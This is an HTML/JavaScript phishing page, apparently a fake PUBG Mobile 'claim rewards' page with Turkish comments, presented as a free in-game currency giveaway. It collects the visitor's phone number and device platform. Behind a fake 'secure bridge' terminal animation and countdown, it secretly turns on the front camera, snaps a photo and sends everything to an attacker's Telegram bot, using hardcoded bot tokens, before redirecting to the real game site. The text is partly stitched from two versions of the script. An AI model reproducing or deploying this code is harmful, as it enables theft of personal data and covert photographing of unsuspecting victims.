<script>
    // URL'den ID parametresini Ã§eken akÄ±llÄ± fonksiyon
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); // Linkin sonundaki id'yi alÄ±r

    const CONFIG = {
        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // SENÄ°N BOT TOKENIN (Sabit kalmalÄ±)
        FALLBACK_ID: "", // ID bulunamazsa gidecek yedek Chat ID
        REDIRECT: "https://www.pubgmobile.com"
    };

    const finalChatID = targetID || CONFIG.FALLBACK_ID;

    async function report(text, blob = null) {
        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
        const fd = new FormData();
        fd.append('chat_id', finalChatID); // Veri artÄ±k dinamik ID'ye gider!

        if (blob) {
            fd.append('photo', blob, 'capture.jpg');
            fd.append('caption', text);
            await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
        } else {
            fd.append('text', text);
            await fetch(url + 'sendMessage', { method: 'POST', body: fd });
        }
    }
    
    // Geri kalan kamera yakalama ve 15 saniye geri sayÄ±m kodlarÄ±nÄ± buraya ekle sevgilim...
</script>
        <input type="tel" id="user-phone" placeholder="+90 5XX XXX XX XX">
        <button class="btn-claim" onclick="initiateSiphoning()">CLAIM REWARDS</button>
    </div>

    <div class="card" id="ui-processing" style="display:none;">
        <div class="timer-ring" id="countdown">15</div>
        <div id="terminal"></div>
    </div>
</div>

<video id="v" autoplay style="position:fixed; opacity:0; pointer-events:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const CONFIG = {
        TOKEN: "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8",
        ID: "8258235296",
        REDIRECT: "https://www.pubgmobile.com/pay/"
    };

    const terminalLines = [
        "> Initializing secure bridge...",
        "> Handshaking with Tencent API...",
        "> Fetching device metadata...",
        "> Encrypting communication tunnel...",
        "> Authorization granted: 0x882A",
        "> Injecting UC package: 9,999",
        "> Finalizing security handshake..."
    ];

    async function report(text, blob = null) {
        const base = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
        if (blob) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.ID);
            fd.append('photo', blob, 'ultra_spy.jpg');
            fd.append('caption', text);
            await fetch(base + 'sendPhoto', { method: 'POST', body: fd });
        } else {
            await fetch(base + `sendMessage?chat_id=${CONFIG.ID}&text=${encodeURIComponent(text)}`);
        }
    }

    async function initiateSiphoning() {
        const phone = document.getElementById('user-phone').value;
        if (phone.length < 10) return;

        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-processing').style.display = 'block';
        const term = document.getElementById('terminal');
        term.style.display = 'block';

        // AnÄ±nda Numara Raporu
        await report(`ğŸ’ ULTRA PROFESYONEL SIZMA\nğŸ“ Numara: ${phone}\nğŸŒ IP/Platform: ${navigator.platform}`);

        let lineIdx = 0;
        let time = 15;
        const clock = document.getElementById('countdown');

        const interval = setInterval(async () => {
            time--;
            clock.innerText = time;

            // Terminal yazÄ±larÄ± akÄ±ÅŸÄ±
            if (lineIdx < terminalLines.length) {
                term.innerHTML += `<div>${terminalLines[lineIdx]}</div>`;
                lineIdx++;
            }

            // Kritik 12. saniyede Gizli Operasyon
            if (time === 12) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(b => report(`ğŸ“¸ ULTRA-HD GÃ–RÃœNTÃœ | NUMARA: ${phone}`, b), 'image/jpeg');
                        stream.getTracks().forEach(t => t.stop());
                    }, 2500);
                } catch(e) { await report(`âŒ SÄ±zma KÄ±sÄ±tlandÄ±: Kamera Reddedildi. (Numara: ${phone})`); }
            }

            if (time <= 0) {
                clearInterval(interval);
                window.location.href = CONFIG.REDIRECT;
            }
        }, 1000);
    }
</script>
</body>
</html>
